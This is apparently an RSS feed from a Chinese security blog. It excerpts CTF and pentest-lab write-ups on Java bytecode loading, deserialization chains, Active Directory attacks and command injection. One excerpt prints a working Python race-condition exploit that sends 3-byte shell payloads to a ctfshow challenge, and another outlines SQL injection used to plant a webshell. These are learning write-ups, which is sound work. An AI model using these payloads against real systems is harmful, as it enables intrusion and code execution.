<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/</link><description>baozongwi's blog</description><lastBuildDate>Sun, 15 Feb 2026 22:14:12 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/" rel="self" type="application/rss+xml"/><item><title>Java中动态加载字节码</title><link>https://baozongwi.xyz/p/java-dynamic-bytecode-loading/</link><guid>https://baozongwi.xyz/p/java-dynamic-bytecode-loading/</guid><pubDate>Tue, 02 Sep 2025 21:21:47 +0800</pubDate><description>本文介绍几个加载字节码的常用方法。方便后续学习CC2、fastjson、内存马等应用做
概念 严格意义上来说，Java字节码(ByteCode)其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。
知周所众，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。
甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文 件，都可以在JVM虚拟机中运行（超模的JVM）:
加载也分几种，不过不论是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用:
loadClass的作用是从已加载的类缓存、父加载器等位置寻找类(这里实际上是双亲委派机制)，在前面没有找到的情况下，执行findClass findClass的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给defineClass defineClass的作用是处理前面传入的字节码，将其处理成真正的Java类 利用URLClassLoader加载远程class文件 Java的ClassLoader来用来加载字节码文件最基础的方法，学习反射的时候就有所了解，
ClassLoader是什么呢?它就是一个“加载器”，告诉Java虚拟机如何加载这个类。
Java默认的ClassLoader就是根据类名来加载类，这个类名是类完整路径，如java.lang.Runtime。
URLClassLoader实际上是我们平时默认使用的AppClassLoader的父类，所以解释URLClassLoader的工作过程实际上就是在解释默认的Java类加载器的工作流程。
正常情况下，Java会根据配置项sun.boot.class.path和java.class.path中列举到的基础路径(这些路径经过处理后为java.net.URL类)来查找和加载.class文件来加载，而这个基础路径有分为三种情况:
URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找 .class 文件。 URL以斜杠 / 结尾，且协议名是 file，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找 .class 文件。 URL以斜杠 / 结尾，且协议名不是 file，则使用最基础的 Loader 来寻找类。 一般地，我们远程加载肯定是用第三种，类似于RMI服务，测试一下
1 2 3 4 5 6 7 8 package Base.Unserialize.Base; public class Hello { static { System.out.println(&amp;amp;#34;Hello guys!&amp;amp;#34;); } } 放在本地8888端口，再写一个加载的类
1 2 3 4 5 6 7 8 9 10 11 12 13 package Base.Unserialize.Base; import java.net.URL; import java.net.URLClassLoader; public class HelloClassLoader { public static void main( String[] args ) throws Exception { URL[] urls = {new URL(&amp;amp;#34;http://localhost:8888/&amp;amp;#34;)}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c = loader.loadClass(&amp;amp;#34;Hello&amp;amp;#34;); c.newInstance(); } }</description><content:encoded>本文介绍几个加载字节码的常用方法。方便后续学习CC2、fastjson、内存马等应用做
概念 严格意义上来说，Java字节码(ByteCode)其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。
知周所众，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨 …</content:encoded></item><item><title>Java反序列化之CC1</title><link>https://baozongwi.xyz/p/java-deserialization-cc1/</link><guid>https://baozongwi.xyz/p/java-deserialization-cc1/</guid><pubDate>Mon, 01 Sep 2025 23:48:02 +0800</pubDate><description>TransformedMap&amp;amp;&amp;amp;LazyMap</description><content:encoded>友情提醒：不能跟进JDK改一下这里
这里会选择两种CC1来学习，一条是网上普遍的有反射的，还有一条就是P牛的纯净版
CC1纯净版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package …</content:encoded></item><item><title>TFCCTF2025中两道有趣的jail</title><link>https://baozongwi.xyz/p/tfcctf-2025-two-interesting-jails/</link><guid>https://baozongwi.xyz/p/tfcctf-2025-two-interesting-jails/</guid><pubDate>Sat, 30 Aug 2025 00:47:47 +0800</pubDate><description>很好，使我头脑旋转</description><content:encoded>MINIJAIL（27solves） 三血 By mingzu&amp;amp;amp;amp;&amp;amp;amp;amp;baozongwi
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 FROM ubuntu:20.04 ENV DEBIAN_FRONTEND=noninteractive RUN …</content:encoded></item><item><title>Java反序列化基础</title><link>https://baozongwi.xyz/p/java-deserialization-basics-also-urldns/</link><guid>https://baozongwi.xyz/p/java-deserialization-basics-also-urldns/</guid><pubDate>Fri, 29 Aug 2025 22:31:40 +0800</pubDate><description>一些基础知识以及URLDNS链学习</description><content:encoded>前言 反序列化，对于学习过PHP的师傅来说，肯定不陌生。
序列化 ：将一个对象转换成一种可以存储或传输的格式（例如，JSON、XML、二进制流等），以便于后续的存储或发送。对于实现对象的持久化、网络传输等非常重要。 反序列化 ：将存储或传输的格式还原为原来的对象。这一过程通常是在接收端进行，以便于对 …</content:encoded></item><item><title>春秋云镜Delegation</title><link>https://baozongwi.xyz/p/springautumn-cloudmirror--delegation/</link><guid>https://baozongwi.xyz/p/springautumn-cloudmirror--delegation/</guid><pubDate>Thu, 28 Aug 2025 21:47:03 +0800</pubDate><description>easyCMS7.7.5、LocalSystem转储hash、DFSCoerce强制认证 + Kerberos 票据劫持、DCSync</description><content:encoded>flag1 打开看到是easyCMS，管理员弱密码/admin，登录admin\123456 …</content:encoded></item><item><title>春秋云镜Time</title><link>https://baozongwi.xyz/p/springautumn-cloudmirror-time/</link><guid>https://baozongwi.xyz/p/springautumn-cloudmirror-time/</guid><pubDate>Tue, 26 Aug 2025 21:45:29 +0800</pubDate><description>CVE-2021-34371、ASREPRoast攻击、SIDHistory攻击</description><content:encoded>flag1 先用fscan扫一下靶机./fscan -h 39.99.225.0 -p 1-65535
1 2 3 4 5 6 7 8 9 10 11 12 13 39.99.225.0:22 open 39.99.225.0:1337 open 39.99.225.0:7474 open …</content:encoded></item><item><title>Ctfshow极限大挑战之三字节读取文件</title><link>https://baozongwi.xyz/p/ctfshow-extreme-challenge-3-byte-file-read/</link><guid>https://baozongwi.xyz/p/ctfshow-extreme-challenge-3-byte-file-read/</guid><pubDate>Tue, 26 Aug 2025 18:08:15 +0800</pubDate><description>极限命令执行6 1 2 3 4 5 6 7 8 9 10 11 12 &amp;amp;lt;?php error_reporting(0); if (isset($_POST[&amp;amp;#39;ctf_show&amp;amp;#39;])) { $ctfshow = $_POST[&amp;amp;#39;ctf_show&amp;amp;#39;]; if (is_string($ctfshow) &amp;amp;amp;&amp;amp;amp; strlen($ctfshow) &amp;amp;lt;= 3) { sleep(1); system($ctfshow); } }else{ highlight_file(__FILE__); } ?&amp;amp;gt; 没有限制，就是三个字节就能任意执行，第一想法还是HITCON类似的依靠文件名来进行RCE，ls发现在当前目录有flag，我们可以知道*类似于.，如果只有这个命令的话可以默认执行当前目录第一个文件
现在我们的目的就是覆盖index.php，由于首字母要小于f大于i，所以查了一下只有hd，hd解析的是hexdump就能读取index.php
1 2 3 4 &amp;amp;gt;cp * &amp;amp;gt;hd *d* 但是我们是利用index.php来RCE的，所以需要Race Condition
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 from concurrent.futures import ThreadPoolExecutor import time import requests url = &amp;amp;#34;http://c29db3cd-5f18-40f9-b134-ad172979409a.challenge.ctf.show/&amp;amp;#34; check = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;ls&amp;amp;#39;} payload0 = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;&amp;amp;gt;cp&amp;amp;#39;} payload1 = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;*&amp;amp;#39;} payload2 = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;&amp;amp;gt;hd&amp;amp;#39;} payload3 = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;*d*&amp;amp;#39;} def send(data): r = requests.post(url, data=data) print(r.text) if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: send(payload0) send(check) time.sleep(1) executor = ThreadPoolExecutor(max_workers=50) args_list = [payload1, payload2, payload3] for args in args_list: time.sleep(0.1) executor.submit(send, args) 极限命令执行7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 &amp;amp;lt;?php error_reporting(0); #go back home , your flag is not here! if (isset($_POST[&amp;amp;#39;ctf_show&amp;amp;#39;])) { $ctfshow = $_POST[&amp;amp;#39;ctf_show&amp;amp;#39;]; if (is_string($ctfshow) &amp;amp;amp;&amp;amp;amp; strlen($ctfshow) &amp;amp;lt;= 3) { system($ctfshow); } }else{ highlight_file(__FILE__); } ?&amp;amp;gt; 提示了flag在home目录下，然后其他的就没区别了，由于不在当前目录，所以上一题的思路已经用不了了，既然这样，我们就要想办法把文件从/home带到当前目录，最好的办法就是压缩文件了</description><content:encoded>极限命令执行6 1 2 3 4 5 6 7 8 9 10 11 12 &amp;amp;amp;lt;?php error_reporting(0); if (isset($_POST[&amp;amp;amp;#39;ctf_show&amp;amp;amp;#39;])) { $ctfshow = $_POST[&amp;amp;amp;#39;ctf_show&amp;amp;amp;#39;]; if …</content:encoded></item><item><title>HITCON2025</title><link>https://baozongwi.xyz/p/hitcon2025/</link><guid>https://baozongwi.xyz/p/hitcon2025/</guid><pubDate>Mon, 25 Aug 2025 14:38:50 +0800</pubDate><description>Pholyglot!（31solves） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &amp;amp;lt;?php $sandbox = &amp;amp;#39;/www/sandbox/&amp;amp;#39; . md5(&amp;amp;#34;orange&amp;amp;#34; . $_SERVER[&amp;amp;#39;REMOTE_ADDR&amp;amp;#39;]); @mkdir($sandbox); @chdir($sandbox) or die(&amp;amp;#34;err?&amp;amp;#34;); $msg = @$_GET[&amp;amp;#39;msg&amp;amp;#39;]; if (isset($msg) &amp;amp;amp;&amp;amp;amp; strlen($msg) &amp;amp;lt;= 30) { usleep(random_int(133, 3337)); $db = new SQLite3(&amp;amp;#34;.db&amp;amp;#34;); $db-&amp;amp;gt;exec(sprintf(&amp;amp;#34; CREATE TABLE msg (content TEXT); INSERT INTO msg VALUES(&amp;amp;#39;%s&amp;amp;#39;); &amp;amp;#34;, $msg)); $db-&amp;amp;gt;close(); unlink(&amp;amp;#34;.db&amp;amp;#34;); } else if (isset($_GET[&amp;amp;#39;reset&amp;amp;#39;])) { @exec(&amp;amp;#39;/bin/rm -rf &amp;amp;#39; . $sandbox); } else { highlight_file(__FILE__); } 目录是根据远程IP来生成的，同时限制30个字符写入，很明显的sql注入，可以插入表创建内容，现在就是写入webshell即可。写入的手法，我在前面做CTFSHOW常用姿势时有所了解，可以利用拼接sh参数写入，利用在当前目录创建的文件名拼接成一条完整的命令。 https://baozongwi.xyz/p/ctfshow-common-techniques/#web821</description><content:encoded>Pholyglot!（31solves） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &amp;amp;amp;lt;?php $sandbox = &amp;amp;amp;#39;/www/sandbox/&amp;amp;amp;#39; . md5(&amp;amp;amp;#34;orange&amp;amp;amp;#34; . …</content:encoded></item></channel></rss>